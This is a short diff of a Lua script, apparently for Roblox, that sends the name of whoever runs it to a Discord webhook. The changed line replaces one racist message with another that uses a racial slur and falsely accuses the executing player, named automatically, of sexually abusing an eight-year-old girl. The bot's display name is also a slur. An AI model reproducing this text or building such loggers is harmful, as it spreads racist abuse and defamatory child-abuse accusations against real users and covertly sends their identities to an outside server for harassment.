@@ -16,7 +16,7 @@ local Webhook = "https://discord.com/api/webhooks/1338202575836807224/hOmTSgVGcK
 
 local data = 
     {
-        ["content"] = `Looks like this nigga **{game.Players.LocalPlayer.Name}** executed this lmfao` ,
+        ["content"] = `This nigger **{game.Players.LocalPlayer.Name}** like jerk off on 8 years old girls` ,
         ["username"] = "Nigga logger",
         ["avatar_url"] = "https://i.imgur.com/oY117mc.png",
         ["embeds"] = {{
